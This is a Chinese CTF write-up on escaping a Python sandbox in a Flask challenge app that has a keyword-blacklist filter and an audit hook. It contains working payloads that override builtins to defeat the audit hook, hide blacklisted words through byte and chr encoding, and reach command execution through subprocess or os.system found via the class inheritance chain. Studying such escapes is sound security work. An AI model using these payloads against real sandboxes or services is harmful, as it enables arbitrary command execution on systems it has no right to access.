---
title: Pyjail沙箱逃逸
date: 2026-03-23 19:03:14
tags:
index_img: https://i0.hdslb.com/bfs/article/a2388e1e8d754893e5b204d95da21cebfc1f5684.png@1256w_754h_!web-article-pic.avif
categories: CTF
---

## 引子

### [SHCTF_3rd]Eazy_Pyrunner

通过任意文件读取漏洞我们可以读到源代码

```php
from flask import Flask, render_template_string, request, jsonify
import subprocess
import tempfile
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    # 获取文件名参数，默认读取 'pages/index.html'
    file_name = request.args.get('file', 'pages/index.html')
    
    try:
        with open(file_name, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception as e:
        # 如果文件不存在或出错，回退到默认页面
        with open('pages/index.html', 'r', encoding='utf-8') as f:
            content = f.read()
            
    return render_template_string(content)

def waf(code):
    """
    简单的关键字过滤函数
    """
    blacklisted_keywords = [
        'import', 'open', 'read', 'write', 'exec', 'eval', 
        '__', 'os', 'sys', 'subprocess', 'run', 'flag', 
        '\'', '\"'
    ]
    
    for keyword in blacklisted_keywords:
        if keyword in code:
            return False
    return True

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.json.get('code', '')
    
    if not code:
        return jsonify({'error': '请输入Python代码'})
    
    if not waf(code):
        return jsonify({'error': 'Hacker!'})
    
    temp_file_name = None
    try:
        # 创建临时文件
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            # 构造包含审计钩子 (Audit Hook) 的沙箱代码
            sandbox_code = f"""
import sys
sys.modules['os'] = 'not allowed'

def is_my_love_event(event_name):
    return event_name.startswith("Nothing is my love but you.")

def my_audit_hook(event_name, arg):
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)

{code}
"""
            f.write(sandbox_code)
            temp_file_name = f.name

        # 执行临时文件
        result = subprocess.run(
            [sys.executable, temp_file_name],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        return jsonify({
            'stdout': result.stdout,
            'stderr': result.stderr
        })

    except subprocess.TimeoutExpired:
        return jsonify({'error': '代码执行超时（超过10秒）'})
    
    except Exception as e:
        return jsonify({'error': f'执行出错: {str(e)}'})
    
    finally:
        # 清理临时文件
        if temp_file_name and os.path.exists(temp_file_name):
            os.unlink(temp_file_name)

if __name__ == '__main__':
    app.run(debug=True)
```

一个python执行沙盒，我们重点关注两部分

WAF：

```python
blacklisted_keywords = [
        'import', 'open', 'read', 'write', 'exec', 'eval', 
        '__', 'os', 'sys', 'subprocess', 'run', 'flag', 
        '\'', '\"'
    ]
```

沙箱：

```python
import sys
sys.modules['os'] = 'not allowed'  #重新定义os模块为字符串

def is_my_love_event(event_name):
    return event_name.startswith("Nothing is my love but you.")

def my_audit_hook(event_name, arg):  #审计钩子
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)
```

python有一个特性，我们可以重新定义内置函数

![image-20260323191949266](https://gitee.com/bobrocket/img/raw/master/image-20260323191949266.png)

这样我们就可以绕过审计钩子

```python
def len(x):return 0
def is_my_love_event(x):return TRUE
```

#### 方法一（恢复os模块）

下面我们用typhon绕一下WAF

```python
(a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](list(dict(uuid=9))[0])._get_command_stdout(bytes([47,114,101,97,100,95,102,108,97,103]))
```

我们发现会报错，原因是uuid需要os模块而它被污染，那么有没有办法恢复

![image-20260323192947298](https://gitee.com/bobrocket/img/raw/master/image-20260323192947298.png)

os模块对象被污染所以无法重载

![image-20260323193027039](https://gitee.com/bobrocket/img/raw/master/image-20260323193027039.png)

直接删除就行了

最终payload

```python
def len(x):return 0
def is_my_love_event(x):return True
del (a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](chr(115)+chr(121)+chr(115)).modules[bytes([111, 115]).decode()]
print((a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](list(dict(ssecorpbus=9))[0][::-1]).getoutput(bytes([47, 114, 101, 97, 100, 95, 102, 108, 97, 103]).decode()))
```

### 方法二（继承链）

[Python 沙箱逃逸学习笔记 - se1zer - 博客园](https://www.cnblogs.com/seizer/p/19574448)

我们可以通过继承链找到已经加载os模块的子类

关键字绕过方法可以参考ssti

```python
# 构造关键字符串
clss = str().join(chr(x) for x in [0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f])      # __class__
mro = str().join(chr(x) for x in [0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f])                # __mro__
sclss = str().join(chr(x) for x in [0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f])  # __subclasses__
it = str().join(chr(x) for x in [0x5f,0x5f,0x69,0x6e,0x69,0x74,0x5f,0x5f])           # __init__
gl = str().join(chr(x) for x in [0x5f,0x5f,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x73,0x5f,0x5f])  # __globals__

ss = str().join(chr(x) for x in [0x73,0x79,0x73,0x74,0x65,0x6d])   # system
s = str().join(chr(x) for x in [0x73,0x79,0x73])                    # os
cmd = str().join(chr(x) for x in [0x2f,0x72,0x65,0x61,0x64,0x5f,0x66,0x6c,0x61,0x67])  # /read_flag

wrapc = str().join(chr(x) for x in [0x5f,0x77,0x72,0x61,0x70,0x5f,0x63,0x6c,0x6f,0x73,0x65])  # _wrap_close
ne = str().join(chr(x) for x in [0x5f,0x5f,0x6e,0x61,0x6d,0x65,0x5f,0x5f])  # __name__

# 核心攻击代码
for i in getattr(getattr(getattr([],clss),mro)[1],sclss)():
    try:
        if (wrapc == str(getattr(i,ne))):
            is_my_love_event = lambda event: True
            len = lambda event: 0
            r = getattr(getattr(i,it),gl)[ss](cmd)
            print(r)
            break
    except Exception as e:
        print(e)
        break
```

